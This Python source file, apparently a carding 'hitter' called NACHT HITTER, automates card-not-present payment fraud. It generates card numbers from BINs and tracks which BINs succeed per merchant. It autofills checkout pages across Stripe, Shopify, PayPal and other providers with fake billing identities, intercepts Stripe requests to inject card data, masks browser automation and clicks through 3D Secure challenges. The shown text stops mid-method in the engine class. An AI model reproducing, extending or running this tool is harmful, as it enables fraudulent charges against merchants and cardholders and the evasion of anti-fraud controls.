#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NACHT HITTER — Engine v3
"""

import re
import json
import os
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
from collections import defaultdict
from datetime import datetime
from typing import Callable, Dict, List, Optional, Awaitable
from playwright.async_api import async_playwright, Page, Route, Request

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Config ────────────────────────────────────────────────────────────────────
DATABASE       = "nacht_hitter.db"
MAX_ATTEMPTS   = 100
MAX_CONCURRENT = 3
SCREENSHOT_DIR = "nacht_screenshots"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

FAKE_BILLING = {
    "first_name": "John",
    "last_name":  "Smith",
    "name":       "John Smith",
    "address":    "123 Main Street",
    "city":       "New York",
    "state":      "NY",
    "zip":        "10001",
    "country":    "US",
    "phone":      "2125551234",
}

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# ── Provider Detection ────────────────────────────────────────────────────────
def detect_provider(url: str, html: str = "") -> str:
    u = url.lower()
    if "stripe.com" in u:                            return "stripe"
    if "checkout.com" in u:                          return "checkoutcom"
    if "shopify.com" in u or "myshopify.com" in u:   return "shopify"
    if "paypal.com" in u:                            return "paypal"
    if "braintree" in u or "braintreegateway" in u:  return "braintree"
    if "adyen.com" in u or "adyen" in u:             return "adyen"
    if "squareup.com" in u or "square" in u:         return "square"
    if "mollie.com" in u:                            return "mollie"
    if "klarna.com" in u:                            return "klarna"
    if "authorize.net" in u or "authorizenet" in u:  return "authorizenet"
    if html:
        h = html.lower()
        if "woocommerce" in h:                       return "woocommerce"
        if "bigcommerce" in h:                       return "bigcommerce"
        if "window.shopify" in h or "shopify.com/s/files" in h: return "shopify"
        if "stripe.com/v3" in h or "js.stripe.com" in h:        return "stripe"
        if "braintree" in h:                         return "braintree"
        if "adyen" in h:                             return "adyen"
        if "paypal" in h:                            return "paypal"
        if "mollie" in h:                            return "mollie"
        if "klarna" in h:                            return "klarna"
        if "authorize.net" in h:                     return "authorizenet"
        if "square" in h:                            return "square"
        if "wix.com" in h:                           return "wix"
        if "ecwid" in h:                             return "ecwid"
        if "checkout.com" in h:                      return "checkoutcom"
    return "unknown"

# ── Database ──────────────────────────────────────────────────────────────────
def init_db(db_path: str = DATABASE):
    conn = sqlite3.connect(db_path)
    conn.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, user_id INTEGER, card TEXT,
        merchant TEXT, product TEXT, amount TEXT,
        success INTEGER, decline_code TEXT,
        receipt_url TEXT, response_time REAL,
        screenshot_path TEXT
    )""")
    conn.commit()
    conn.close()

# ── Card Pattern Learner ──────────────────────────────────────────────────────
class CardPatternLearner:
    def __init__(self):
        self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(lambda: defaultdict(lambda: {"s": 0, "f": 0}))

    def learn(self, card: Dict, merchant: str, success: bool):
        bin6 = card["card"][:6]
        if success:
            self.patterns[merchant][bin6]["s"] += 1
        else:
            self.patterns[merchant][bin6]["f"] += 1

    def suggest(self, merchant: str) -> Optional[str]:
        best, best_rate = None, -1.0
        for bin6, data in self.patterns.get(merchant, {}).items():
            total = data["s"] + data["f"]
            if total >= 2:
                rate = data["s"] / total
                if rate > best_rate:
                    best_rate, best = rate, bin6
        return best

# ── URL Analyzer ──────────────────────────────────────────────────────────────
CURRENCY_SYMBOL = {"$": "USD", "€": "EUR", "£": "GBP", "₹": "INR",
                   "¥": "JPY", "R$": "BRL", "C$": "CAD", "A$": "AUD"}
SYMBOL_OF = {v: k for k, v in CURRENCY_SYMBOL.items()}

class URLAnalyzer:
    @staticmethod
    def _from_scripts(html: str) -> Dict:
        out = {"amount": None, "product": None, "merchant": None,
               "product_url": None, "currency": None}
        for script in re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL):
            for pat, kind in [
                (r'window\.__STRIPE__\s*=\s*({.*?});',         "obj"),
                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});',  "obj"),
                (r'var\s+stripePaymentData\s*=\s*({.*?});',    "obj"),
                (r'"paymentIntent"\s*:\s*({[^{}]{0,2000}})',   "obj"),
                (r'"amount"\s*:\s*(\d+)',                       "amount"),
                (r'"currency"\s*:\s*"([A-Za-z]{2,5})"',        "currency"),
                (r'"name"\s*:\s*"([^"]{1,120})"',              "name"),
                (r'"business_name"\s*:\s*"([^"]+)"',           "business"),
                (r'"product_url"\s*:\s*"([^"]+)"',             "product_url"),
            ]:
                m = re.search(pat, script, re.DOTALL)
                if not m:
                    continue
                try:
                    if kind == "obj":
                        def _w(o):
                            if isinstance(o, dict):
                                if isinstance(o.get("amount"), (int, float)):
                                    out["amount"] = o["amount"]
                                if isinstance(o.get("currency"), str) and len(o["currency"]) <= 5:
                                    out["currency"] = o["currency"].upper()
                                if isinstance(o.get("name"), str) and len(o["name"]) > 1:
                                    out["product"] = o["name"]
                                if isinstance(o.get("business_name"), str):
                                    out["merchant"] = o["business_name"]
                                if isinstance(o.get("display_name"), str):
                                    out["merchant"] = out["merchant"] or o["display_name"]
                                if isinstance(o.get("product_url"), str):
                                    out["product_url"] = o["product_url"]
                                for v in o.values():
                                    _w(v)
                            elif isinstance(o, list):
                                for i in o: _w(i)
                        _w(json.loads(m.group(1)))
                    elif kind == "amount":
                        if out["amount"] is None:
                            out["amount"] = int(m.group(1))
                    elif kind == "currency":
                        if out["currency"] is None:
                            out["currency"] = m.group(1).upper()
                    elif kind == "name":
                        if out["product"] is None:
                            out["product"] = m.group(1)
                    elif kind == "business":
                        out["merchant"] = m.group(1)
                    elif kind == "product_url":
                        out["product_url"] = m.group(1)
                except Exception:
                    pass
        return out

    @staticmethod
    def _fmt(raw, currency: str = "USD") -> str:
        sym = SYMBOL_OF.get(currency.upper(), currency.upper() + " ")
        no_cent = currency.upper() in ("JPY", "KRW", "CLP", "VND", "IDR")
        try:
            v = float(str(raw).replace(",", ""))
        except Exception:
            return f"{sym}{raw}"
        if not no_cent and v > 100:
            v = v / 100
        return f"{sym}{v:.2f}" if not no_cent else f"{sym}{int(v)}"

    @staticmethod
    def extract_currency(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("currency"):
            return sd["currency"]
        for pat in [
            r'"currency"\s*:\s*"([A-Z]{3})"',
            r'data-currency="([A-Z]{3})"',
            r'currency["\s:=]+([A-Z]{3})\b',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).upper()
        # detect symbol
        for sym, code in CURRENCY_SYMBOL.items():
            if sym in html[:5000]:
                return code
        return "USD"

    @staticmethod
    def extract_amount(html: str, currency: str = "USD") -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        cur = sd.get("currency") or currency
        if sd.get("amount") is not None:
            return URLAnalyzer._fmt(sd["amount"], cur)
        for pat in [
            r'"amount_display"\s*:\s*"([^"]+)"',
            r'"formatted_amount"\s*:\s*"([^"]+)"',
            r'data-amount="(\d+)"',
            r'"amount_subtotal"\s*:\s*(\d+)',
            r'"total"\s*:\s*(\d+)',
            r'"amount"\s*:\s*(\d+)',
            r'([\$€£₹])\s*([\d,]+\.?\d*)',
            r'Total[:\s]+[\$€£₹]?\s*([\d,]+\.?\d*)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                if m.lastindex == 2:
                    sym, num = m.group(1), m.group(2).replace(",", "")
                    detected_cur = CURRENCY_SYMBOL.get(sym, cur)
                    return URLAnalyzer._fmt(float(num), detected_cur)
                val = m.group(1).strip()
                if re.match(r"^[\d,]+\.?\d*$", val.replace(",", "")):
                    return URLAnalyzer._fmt(float(val.replace(",", "")), cur)
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product"):
            return sd["product"]
        for pat in [
            r'<meta property="og:title" content="([^"]+)"',
            r'"name"\s*:\s*"([^"]{3,120})"',
            r"<h1[^>]*>([^<]{3,120})</h1>",
            r"<title>([^<]{3,120})</title>",
            r'"product_name"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                name = re.sub(r'<[^>]+>', '', m.group(1)).strip()
                name = re.sub(r'\s*[|–\-]\s*(Stripe|Checkout|Shopify|Pay).*$',
                               '', name, flags=re.IGNORECASE)
                if name and len(name) > 2:
                    return name[:120]
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("merchant"):
            return sd["merchant"]
        for pat in [
            r'"business_name"\s*:\s*"([^"]+)"',
            r'"display_name"\s*:\s*"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
            r'<title>([^<]+?)\s*[|–\-]\s*(?:Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|WooCommerce)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_product_url(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product_url"):
            return sd["product_url"]
        for pat in [
            r'<meta property="og:url" content="([^"]+)"',
            r'<link rel="canonical" href="([^"]+)"',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m and m.group(1).startswith("http"):
                return m.group(1).strip()
        return None

    @staticmethod
    async def analyze(url: str, use_playwright: bool = False) -> Dict:
        result: Dict = {
            "url": url, "merchant": "Unknown", "product": "Unknown",
            "product_url": None, "amount": None, "currency": "USD",
            "success": False, "error": None,
        }
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS),
                       "Accept-Language": "en-US,en;q=0.9"}
            r = requests.get(url, timeout=15, verify=False,
                             headers=headers, allow_redirects=True)
            if r.status_code == 200:
                html = r.text
                currency = URLAnalyzer.extract_currency(html)
                result.update({
                    "merchant":    URLAnalyzer.extract_merchant(html),
                    "product":     URLAnalyzer.extract_product_name(html) or "Unknown",
                    "product_url": URLAnalyzer.extract_product_url(html),
                    "amount":      URLAnalyzer.extract_amount(html, currency),
                    "currency":    currency,
                    "success":     True,
                })
            else:
                result["error"] = f"HTTP {r.status_code}"
        except Exception as e:
            result["error"] = str(e)

        needs_deep = (
            use_playwright and
            (result["merchant"] == "Unknown" or
             result["product"] in ("Unknown", "Stripe Checkout", "Checkout", "Shopify Checkout"))
        )
        if needs_deep:
            deep = await URLAnalyzer._playwright_analyze(url)
            if deep.get("success"):
                if deep["merchant"] != "Unknown":
                    result["merchant"] = deep["merchant"]
                if deep.get("product") not in ("Unknown", None):
                    result["product"] = deep["product"]
                if deep.get("product_url"):
                    result["product_url"] = deep["product_url"]
                if deep.get("amount"):
                    result["amount"] = deep["amount"]
                if deep.get("currency", "USD") != "USD":
                    result["currency"] = deep["currency"]
        return result

    @staticmethod
    async def _playwright_analyze(url: str) -> Dict:
        out: Dict = {"merchant": "Unknown", "product": "Unknown",
                     "product_url": None, "amount": None,
                     "currency": "USD", "success": False}
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox"])
                ctx  = await browser.new_context(ignore_https_errors=True)
                page = await ctx.new_page()
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(3)

                merchant = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:site_name"]');
                    if (m) return m.content;
                    const t = document.title;
                    const x = t.match(/(.+?)\s*[|\u2013\-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                    return x ? x[1] : t;
                }""")
                if merchant and merchant not in ("Stripe Checkout", "Checkout", "Shopify Checkout", "PayPal"):
                    out["merchant"] = merchant.strip()

                product = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:title"]');
                    if (m) return m.content;
                    const h = document.querySelector('h1');
                    return h ? h.innerText.trim() : document.title;
                }""")
                if product and product not in ("Stripe Checkout", "Checkout", "Shopify Checkout"):
                    out["product"] = product.strip()[:120]

                product_url = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:url"]');
                    if (m) return m.content;
                    const l = document.querySelector('link[rel="canonical"]');
                    return l ? l.href : null;
                }""")
                if product_url:
                    out["product_url"] = product_url

                amount_raw = await page.evaluate(r"""() => {
                    const SELS = ['[data-amount]','.amount','.price','.total',
                                  '[class*="amount"]','[class*="price"]','[class*="total"]',
                                  '.order-total','#order-total','.cart-total'];
                    for (const s of SELS) {
                        const el = document.querySelector(s);
                        if (el) { const t = (el.innerText||el.getAttribute('data-amount')||'').trim(); if(t) return t; }
                    }
                    return null;
                }""")
                if amount_raw:
                    am = re.search(r'([€$£₹¥])\s*([\d,]+\.?\d*)', amount_raw)
                    if am:
                        sym, num = am.group(1), am.group(2).replace(",", "")
                        cur = CURRENCY_SYMBOL.get(sym, "USD")
                        out["amount"]   = f"{sym}{num}"
                        out["currency"] = cur
                    else:
                        nm = re.search(r'[\d,]+\.?\d*', amount_raw)
                        if nm:
                            out["amount"] = f"${nm.group(0).replace(',','')}"

                currency_raw = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:price:currency"]');
                    if (m) return m.content;
                    const el = document.querySelector('[data-currency]');
                    return el ? el.getAttribute('data-currency') : null;
                }""")
                if currency_raw:
                    out["currency"] = currency_raw.upper()

                out["success"] = True
                await browser.close()
        except Exception as e:
            out["error"] = str(e)
        return out

# ── Card Generator ────────────────────────────────────────────────────────────
class CardGenerator:
    @staticmethod
    def brand(num: str) -> str:
        n = re.sub(r"\D", "", num)[:6]
        if re.match(r"^3[47]", n):                             return "amex"
        if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "mastercard"
        if re.match(r"^4", n):                                 return "visa"
        if re.match(r"^6(?:011|5)", n):                        return "discover"
        return "unknown"

    @staticmethod
    def _luhn_ok(num: str) -> bool:
        d = [int(x) for x in num]
        return (sum(d[-1::-2]) + sum(sum(divmod(x*2,10)) for x in d[-2::-2])) % 10 == 0

    @staticmethod
    def generate(bin_str: str) -> Optional[Dict]:
        if not bin_str or len(bin_str) < 4:
            return None
        parts = bin_str.split("|")
        raw   = re.sub(r"[^0-9xX]", "", parts[0])
        test  = raw.replace("x","0").replace("X","0")
        b     = CardGenerator.brand(test)
        tlen  = 15 if b == "amex" else 16
        cvvl  = 4  if b == "amex" else 3

        card = "".join(str(random.randint(0,9)) if c.lower()=="x" else c for c in raw)
        card += "".join(str(random.randint(0,9)) for _ in range(tlen-len(card)-1))
        check = next((i for i in range(10) if CardGenerator._luhn_ok(card+str(i))), 0)
        full  = card + str(check)

        yr_now = datetime.now().year % 100
        month  = f"{random.randint(1,12):02d}"
        year   = f"{yr_now + random.randint(1,5):02d}"
        cvv    = "".join(str(random.randint(0,9)) for _ in range(cvvl))

        if len(parts) > 1 and parts[1] and parts[1].lower() != "xx":
            month = parts[1].zfill(2)
        if len(parts) > 2 and parts[2] and parts[2].lower() != "xx":
            year  = parts[2].zfill(2)
        if len(parts) > 3 and parts[3] and parts[3].lower() not in ("xxx","xxxx"):
            cvv   = parts[3].zfill(cvvl)

        return {"card": full, "month": month, "year": year, "cvv": cvv, "brand": b}

    @staticmethod
    def generate_many(bin_str: str, count: int) -> List[Dict]:
        return [c for _ in range(count) if (c := CardGenerator.generate(bin_str))]

    @staticmethod
    def parse(s: str) -> Optional[Dict]:
        p = s.strip().split("|")
        if len(p) == 4:
            return {"card": p[0].strip(), "month": p[1].strip().zfill(2),
                    "year": p[2].strip().zfill(2), "cvv": p[3].strip(),
                    "brand": CardGenerator.brand(p[0].strip())}
        return None

# ── Fingerprint ───────────────────────────────────────────────────────────────
class Fingerprint:
    @staticmethod
    def generate() -> Dict:
        return {"user_agent":  random.choice(USER_AGENTS),
                "viewport":    {"width": 1920, "height": 1080},
                "locale":      "en-US",
                "timezone_id": "America/New_York"}

    STEALTH = """
        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
        window.chrome={runtime:{}};
        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
    """

# ── Rate Limiter ──────────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self):
        self.delay    = 1.0
        self.failures = 0

    def next(self, success: bool) -> float:
        if success:
            self.failures = 0
            self.delay    = max(0.5, self.delay * 0.85)
        else:
            self.failures += 1
            self.delay     = min(8.0, self.delay * 1.3 + self.failures * 0.3)
        return max(0.5, min(10.0, self.delay))

# ── Page Helpers ──────────────────────────────────────────────────────────────
async def _fill(page: Page, selectors: List[str], value: str) -> bool:
    """Fill first matching selector on page OR any child iframe."""
    for sel in selectors:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.click(); await asyncio.sleep(0.05)
                await el.fill(""); await el.type(value, delay=25)
                return True
        except Exception:
            pass
    for frame in page.frames:
        if frame == page.main_frame:
            continue
        for sel in selectors:
            try:
                el = await frame.query_selector(sel)
                if el and await el.is_visible():
                    await el.click(); await asyncio.sleep(0.05)
                    await el.fill(""); await el.type(value, delay=25)
                    return True
            except Exception:
                pass
    return False


async def _click_submit(page: Page, selectors: List[str]) -> bool:
    """Click first matching submit button; JS fallback."""
    for sel in selectors:
        try:
            btn = await page.query_selector(sel)
            if btn and await btn.is_visible() and await btn.is_enabled():
                await btn.click(); return True
        except Exception:
            pass
    try:
        done = await page.evaluate("""() => {
            const b = [...document.querySelectorAll(
                'button[type="submit"],input[type="submit"],button')
            ].find(e => e.offsetParent!==null && !e.disabled);
            if (b) { b.click(); return true; }
            const f = document.querySelector('form');
            if (f) { f.submit(); return true; }
            return false;
        }""")
        return bool(done)
    except Exception:
        return False


async def _fill_billing(page: Page):
    mapping = [
        (["#billing_first_name","input[name='billing_first_name']","input[name='firstName']",
          "input[id*='first_name']","input[placeholder*='First name']","input[placeholder*='First Name']"],
         FAKE_BILLING["first_name"]),
        (["#billing_last_name","input[name='billing_last_name']","input[name='lastName']",
          "input[id*='last_name']","input[placeholder*='Last name']","input[placeholder*='Last Name']"],
         FAKE_BILLING["last_name"]),
        (["#billing_address_1","input[name='billing_address_1']","input[name='address']",
          "input[name='address1']","input[name='street']","input[placeholder*='Address']",
          "input[autocomplete='street-address']"],
         FAKE_BILLING["address"]),
        (["#billing_city","input[name='billing_city']","input[name='city']",
          "input[placeholder*='City']","input[autocomplete='address-level2']"],
         FAKE_BILLING["city"]),
        (["#billing_postcode","input[name='billing_postcode']","input[name='zip']",
          "input[name='postal_code']","input[placeholder*='ZIP']","input[placeholder*='Postal']",
          "input[autocomplete='postal-code']"],
         FAKE_BILLING["zip"]),
        (["#billing_phone","input[name='billing_phone']","input[name='phone']",
          "input[type='tel']","input[placeholder*='Phone']"],
         FAKE_BILLING["phone"]),
    ]
    for sels, val in mapping:
        await _fill(page, sels, val)
    # country dropdown
    for sel in ["#billing_country","select[name='billing_country']",
                "select[name='country']","select[id*='country']","select[autocomplete='country']"]:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.select_option(value="US"); break
        except Exception:
            pass
    # state dropdown
    for sel in ["#billing_state","select[name='billing_state']",
                "select[name='state']","select[id*='state']"]:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.select_option(value="NY"); break
        except Exception:
            pass


# ── 3DS ───────────────────────────────────────────────────────────────────────
_3DS_FRAME_KEYS = ("3ds","challenge","acs","secure","authenticate",
                   "cardinal","songbird","centinel","redirect")
_3DS_BODY_KEYS  = ("3d secure","3ds","authentication required","verify your card",
                   "enter the otp","one-time password","verification code",
                   "secure code","enter code","sms code")
_3DS_BTN_SELS   = ['button[type="submit"]','input[type="submit"]',
                   'button:has-text("Continue")','button:has-text("Submit")',
                   'button:has-text("Confirm")','button:has-text("Proceed")',
                   'button:has-text("Verify")','a:has-text("Continue")',
                   '#proceed-button','.btn-primary','#btnSubmit','#continue']

async def _detect_3ds(page: Page) -> bool:
    for frame in page.frames:
        if any(k in (frame.url or "").lower() for k in _3DS_FRAME_KEYS):
            return True
    try:
        body = (await page.text_content("body") or "").lower()
        if any(k in body for k in _3DS_BODY_KEYS):
            return True
    except Exception:
        pass
    return False

async def _bypass_3ds(page: Page):
    for sel in _3DS_BTN_SELS:
        try:
            btn = await page.query_selector(sel)
            if btn and await btn.is_visible():
                await btn.click(); await asyncio.sleep(3); return
        except Exception:
            pass
    for frame in page.frames:
        if frame == page.main_frame:
            continue
        for sel in _3DS_BTN_SELS:
            try:
                btn = await frame.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click(); await asyncio.sleep(3); return
            except Exception:
                pass
        try:
            ok = await frame.evaluate("()=>{const f=document.querySelector('form');if(f){f.submit();return true;}return false;}")
            if ok:
                await asyncio.sleep(3); return
        except Exception:
            pass

async def _wait_3ds(page: Page, ms: int = 12000) -> bool:
    deadline = time.time() + ms / 1000
    while time.time() < deadline:
        if await _detect_3ds(page): return True
        await asyncio.sleep(0.5)
    return False


# ── Screenshot ────────────────────────────────────────────────────────────────
async def take_screenshot(page: Page, label: str) -> Optional[str]:
    try:
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        path = os.path.join(SCREENSHOT_DIR, f"{label}_{ts}.png")
        await page.screenshot(path=path, full_page=False)
        return path
    except Exception:
        return None


# ── Stripe Autofill (iframe-aware + route intercept) ──────────────────────────
STRIPE_SUBMIT_SELS = [
    ".SubmitButton","[class*='SubmitButton']",
    "button[type='submit']","[data-testid*='submit']",
    "button:has-text('Pay')","button:has-text('Subscribe')",
    "button:has-text('Donate')","button:has-text('Confirm')",
]

async def _stripe_setup(page: Page, card: Dict):
    async def _intercept(route: Route, request: Request):
        if request.method == "POST" and "stripe.com" in request.url:
            pd = request.post_data or ""
            c  = card
            # URL-encoded token/source
            pd = re.sub(r'card%5Bnumber%5D=[^&]*',    f'card%5Bnumber%5D={c["card"]}',    pd)
            pd = re.sub(r'card%5Bexp_month%5D=[^&]*',  f'card%5Bexp_month%5D={c["month"]}', pd)
            pd = re.sub(r'card%5Bexp_year%5D=[^&]*',   f'card%5Bexp_year%5D={c["year"]}',   pd)
            pd = re.sub(r'card%5Bcvc%5D=[^&]*',        f'card%5Bcvc%5D={c["cvv"]}',         pd)
            pd = re.sub(r'card\[number\]=[^&]*',        f'card[number]={c["card"]}',         pd)
            pd = re.sub(r'card\[exp_month\]=[^&]*',     f'card[exp_month]={c["month"]}',     pd)
            pd = re.sub(r'card\[exp_year\]=[^&]*',      f'card[exp_year]={c["year"]}',       pd)
            pd = re.sub(r'card\[cvc\]=[^&]*',           f'card[cvc]={c["cvv"]}',             pd)
            # JSON payment method
            pd = re.sub(r'"number"\s*:\s*"[^"]*"',     f'"number":"{c["card"]}"',           pd)
            pd = re.sub(r'"exp_month"\s*:\s*\d+',       f'"exp_month":{int(c["month"])}',    pd)
            pd = re.sub(r'"exp_year"\s*:\s*\d+',        f'"exp_year":20{c["year"]}',         pd)
            pd = re.sub(r'"cvc"\s*:\s*"[^"]*"',         f'"cvc":"{c["cvv"]}"',               pd)
            await route.continue_(post_data=pd); return
        await route.continue_()
    await page.route("**/*", _intercept)

    card_sels = [
        "[data-elements-stable-field-name='cardNumber'] input",
        "#cardNumber","input[name='cardNumber']","[autocomplete='cc-number']",
        "input[placeholder*='Card number']","input[aria-label*='Card number']",
        "[class*='CardNumber'] input","input[name='number']",
        "input[placeholder*='1234 1234']",
    ]
    exp_sels = [
        "[data-elements-stable-field-name='cardExpiry'] input",
        "#cardExpiry","[name='cardExpiry']","[autocomplete='cc-exp']",
        "input[placeholder*='MM / YY']","input[placeholder*='MM/YY']",
        "[class*='CardExpiry'] input",
    ]
    cvc_sels = [
        "[data-elements-stable-field-name='cardCvc'] input",
        "#cardCvc","[name='cardCvc']","[autocomplete='cc-csc']",
        "input[placeholder*='CVC']","input[placeholder*='CVV']",
        "[class*='CardCvc'] input",
    ]
    name_sels  = ["#billingName","[name='billingName']","[autocomplete='cc-name']",
                  "input[placeholder*='Name on card']","input[placeholder*='Cardholder']"]
    email_sels = ["input[type='email']","input[name*='email']",
                  "input[autocomplete='email']","input[placeholder*='Email']"]

    await _fill(page, card_sels,  card["card"])
    await asyncio.sleep(0.3)
    await _fill(page, exp_sels,   f"{card['month']}/{card['year']}")
    await asyncio.sleep(0.3)
    await _fill(page, cvc_sels,   card["cvv"])
    await _fill(page, name_sels,  FAKE_BILLING["name"])
    await _fill(page, email_sels, f"nacht{random.randint(100,9999)}@gmail.com")


# ── Generic Provider Autofill ─────────────────────────────────────────────────
GENERIC_CARD_SELS = [
    "#cardNumber","input[name='cardNumber']","#card-number","input[name='card_number']",
    "input[name='x_card_num']","[autocomplete='cc-number']",
    "input[placeholder*='Card number']","input[aria-label*='Card number']",
    "#wc-stripe-card-number",".card-number","#credit-card-number",
    "input[data-frames='card-number']","input[data-braintree-name='number']",
    "#number","input[name='number']","input[placeholder*='1234']",
]
GENERIC_EXP_SELS = [
    "#expiryDate","input[name='expiryDate']","#expiry-date","input[name='expiry']",
    "input[name='x_exp_date']","[autocomplete='cc-exp']",
    "input[placeholder*='MM/YY']","input[placeholder*='MM / YY']",
    "#cardExpiry","input[name='expDate']","#expiry","input[name='expirydate']",
    "input[data-frames='expiry-date']","input[data-braintree-name='expiration_date']",
    "#expiration-date",
]
GENERIC_CVC_SELS = [
    "#cvv","input[name='cvv']","input[name='x_card_code']","[autocomplete='cc-csc']",
    "input[placeholder*='CVC']","input[placeholder*='CVV']","input[placeholder*='Security']",
    "#wc-stripe-cvc","#cvc","input[data-frames='cvv']",
    "input[data-braintree-name='cvv']","#verification_value","input[name='verification_value']",
]
GENERIC_NAME_SELS = [
    "#cardholderName","input[name='cardholderName']","input[name='x_card_name']",
    "[autocomplete='cc-name']","input[placeholder*='Name on card']",
    "input[name='cardholder_name']","#cardholder-name","#billingName",
    "input[placeholder*='Cardholder']",
]
GENERIC_EMAIL_SELS = [
    "input[type='email']","#email","input[name='email']",
    "#billing_email","input[name='billing_email']",
    "input[placeholder*='Email']","input[placeholder*='email']",
]
GENERIC_SUBMIT_SELS = [
    "button[type='submit']",".pay-button","[data-testid='pay-button']",
    "#place_order","button:has-text('Pay')","button:has-text('Submit')",
    "button:has-text('Place order')","button:has-text('Complete order')",
    "button:has-text('Pay Now')","button:has-text('Donate')",
    "button:has-text('Subscribe')","button:has-text('Confirm')",
    ".SubmitButton","input[value='Place Order']",
]

PROVIDER_DOMAINS = {
    "checkoutcom":  (["checkout.com","api.checkout.com"], []),
    "shopify":      (["shopify.com","myshopify.com","stripe.com"], [
        (r"credit_card\[number\]=\d+",                "credit_card[number]={card}"),
        (r"credit_card\[month\]=\d+",                 "credit_card[month]={month}"),
        (r"credit_card\[year\]=\d+",                  "credit_card[year]={year}"),
        (r"credit_card\[verification_value\]=\d+",    "credit_card[verification_value]={cvv}"),
    ]),
    "paypal":       (["paypal.com","braintreegateway.com"], []),
    "braintree":    (["braintreegateway.com","braintree-api.com"], []),
    "adyen":        (["adyen.com","checkoutshopper"], []),
    "square":       (["squareup.com","square"], []),
    "mollie":       (["mollie.com","api.mollie.com"], []),
    "klarna":       (["klarna.com","api.klarna.com"], []),
    "authorizenet": (["authorize.net","authorizenet"], []),
    "woocommerce":  (["woocommerce","wc-api","wp-json/wc"], []),
    "bigcommerce":  (["bigcommerce.com","bigcommerce"], []),
    "wix":          (["wix.com","_api/wix-ecommerce"], []),
    "ecwid":        (["ecwid.com","app.ecwid.com"], []),
}

# ── Result Detection ──────────────────────────────────────────────────────────
SUCCESS_URL_KW = ("receipt","thank","success","order_confirmation","complete",
                  "confirmed","order-received","thankyou","thank-you",
                  "payment_success","paid","payment-success")
SUCCESS_BODY_KW= ("order confirmed","payment confirmed","payment successful",
                  "thank you for your order","thank you for your purchase",
                  "your order has been placed","successfully charged",
                  "order received","payment complete")
DECLINE_KW     = ("card was declined","your card was declined","do_not_honor",
                  "insufficient funds","insufficient_funds","card declined",
                  "declined","payment failed","card not supported",
                  "incorrect cvc","incorrect_cvc","expired card","expired_card",
                  "invalid card","processing error","do not honor",
                  "transaction declined","unable to process")

def _check_result(url: str, body: str):
    """Returns (success: bool, decline_code: str|None)"""
    u = url.lower()
    b = body.lower()
    # must NOT be still on the checkout page to count as success
    still_checkout = "checkout.stripe.com" in u or "checkout.com/pay" in u
    if not still_checkout:
        if any(k in u for k in SUCCESS_URL_KW):
            return True, None
        if any(k in b for k in SUCCESS_BODY_KW):
            return True, None
    for kw in DECLINE_KW:
        if kw in b:
            return False, kw.replace(" ", "_")
    return False, "unknown"


# ── Hitter Engine ─────────────────────────────────────────────────────────────
StepCallback = Callable[[str], Awaitable[None]]

class HitterEngine:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy     = proxy
        self.results:  List[Dict] = []
        self.successes = 0
        self.fails     = 0
        self._sem      = asyncio.Semaphore(MAX_CONCURRENT)

    async def hit(self, url: str, card: Dict, merchant: str, product: str,
                  amount: str, attempt: int,
                  step_cb: Optional[StepCallback] = None) -> Dict:
        async with self._sem:
            return await self._hit(url, card, merchant, product, amount, attempt, step_cb)

    async def _step(self, cb: Optional[StepCallback], msg: str):
